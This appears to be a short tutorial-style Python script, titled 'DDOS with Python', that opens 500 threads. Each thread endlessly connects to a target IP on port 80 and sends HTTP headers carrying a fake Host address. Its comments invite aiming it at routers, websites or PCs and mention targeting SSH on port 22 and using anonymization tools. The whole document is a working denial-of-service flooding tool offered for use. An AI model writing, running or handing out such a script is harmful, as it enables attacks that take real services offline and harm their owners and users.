#DDOS with Python:
#-------------------------------------
import threading
import socket
# python doesnt do multi threading. it is simulated multithreading in python. changes threads simultaneously.
target = '10.0.0.19'
#DDOS an ipaddress or a domain name. your router, your website, your PC, run apache server, do it.
# ddos port 22 = ssh service. 80 = web service down.
port = 80
#anonymization tools needed. fake ip for header not enough.
fake_ip = '182.21.20.32'
#not an attack but endless loop of a socket connection
#already_connected = 0---
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #afinet is creating a new socket. socstream for tcp
        s.connect((target, port))
        #send header.
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        #get/ target, specify http version. encode them and send to port of target
        s.sendto(("Host: "+ fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        #global already_connected---
        #already_connected +=1---
        #print(already_connected)---
        #connect, send, close
#to run in multiple threads
for i in range(500):
    thread = threading.Thread(target=attack)
    #target function and not the ip address
    thread.start()

#500 threads that run this attack method
#to see the amount of connections, use the already_connected variable